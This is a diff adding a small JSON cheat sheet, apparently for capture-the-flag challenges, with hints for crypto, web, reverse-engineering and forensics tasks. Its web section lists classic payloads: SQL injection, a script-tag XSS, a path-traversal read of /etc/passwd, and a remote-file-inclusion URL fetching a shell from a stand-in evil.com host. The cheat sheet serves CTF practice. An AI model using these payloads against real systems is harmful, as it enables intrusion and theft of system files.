@@ -1,0 +1,26 @@
+{
+  "crypto": {
+    "caesar": "Try all 26 shifts",
+    "base64": "Look for = padding",
+    "rot13": "Letter substitution",
+    "xor": "Try single-byte keys"
+  },
+  "web": {
+    "sqli": "' OR '1'='1",
+    "xss": "<script>alert(1)</script>",
+    "lfi": "../../../etc/passwd",
+    "rfi": "http://evil.com/shell.txt"
+  },
+  "rev": {
+    "strings": "strings binary",
+    "objdump": "objdump -d binary",
+    "gdb": "gdb binary",
+    "radare2": "r2 binary"
+  },
+  "forensics": {
+    "binwalk": "binwalk -e file",
+    "steghide": "steghide extract -sf image.jpg",
+    "exiftool": "exiftool image.jpg",
+    "volatility": "volatility -f memory.dump pslist"
+  }
+}
